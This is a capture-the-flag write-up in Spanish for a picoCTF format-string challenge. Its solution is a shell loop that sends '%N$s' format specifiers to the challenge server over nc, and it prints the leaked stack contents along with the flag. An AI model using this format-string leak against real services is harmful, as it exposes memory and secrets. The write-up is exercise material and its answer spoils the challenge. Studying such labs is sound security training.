# Level 4
## Objetivo
Story telling class 1/2I'm just copying and pasting with this [program](https://artifacts.picoctf.net/c/91/vuln). What can go wrong? You can view source [here](https://artifacts.picoctf.net/c/91/vuln.c). And connect with it using:`nc saturn.picoctf.net 60135`
## Pistas
Format Strings
## Solucion
┌──(diego㉿kali)-[~]
└─$ for i in {0..999}; do echo "%$i\$s" | nc saturn.picoctf.net 60135; done
Tell me a story and then I'll tell you one >> Here's a story - 
%0$s
Tell me a story and then I'll tell you one >> Here's a story - 
%1$s
Tell me a story and then I'll tell you one >> Here's a story - 
���
Tell me a story and then I'll tell you one >> Here's a story - 
�ú,
Tell me a story and then I'll tell you one >> Here's a story - 
Tell me a story and then I'll tell you one >> Here's a story - 
Tell me a story and then I'll tell you one >> Here's a story - 
(null)
Tell me a story and then I'll tell you one >> Here's a story - 
/
Tell me a story and then I'll tell you one >> Here's a story - 

Tell me a story and then I'll tell you one >> Here's a story - 
Tell me a story and then I'll tell you one >> Here's a story - 
(null)
Tell me a story and then I'll tell you one >> Here's a story - 
�.
Tell me a story and then I'll tell you one >> Here's a story - 

Tell me a story and then I'll tell you one >> Here's a story - 
(null)
Tell me a story and then I'll tell you one >> Here's a story - 

Tell me a story and then I'll tell you one >> Here's a story - 
�������
Tell me a story and then I'll tell you one >> Here's a story - 
�(��g���g���g���g���g���g���g���h���
Tell me a story and then I'll tell you one >> Here's a story - 
Tell me a story and then I'll tell you one >> Here's a story - 
(null)
Tell me a story and then I'll tell you one >> Here's a story - 
setresgid
Tell me a story and then I'll tell you one >> Here's a story - 
����
Tell me a story and then I'll tell you one >> Here's a story - 
��e�

Tell me a story and then I'll tell you one >> Here's a story - 
setresgid
Tell me a story and then I'll tell you one >> Here's a story - 

Tell me a story and then I'll tell you one >> Here's a story - 
CTF{L34k1ng_Fl4g_0ff_St4ck_64bf08ef}
Tell me a story and then I'll tell you one >> Here's a story - 
����
Tell me a story and then I'll tell you one >> Here's a story - 
ii

## Notas Adicionales
|comando|descripcion|
|-------|-----------|
|xxx|xxx|
## Referencias
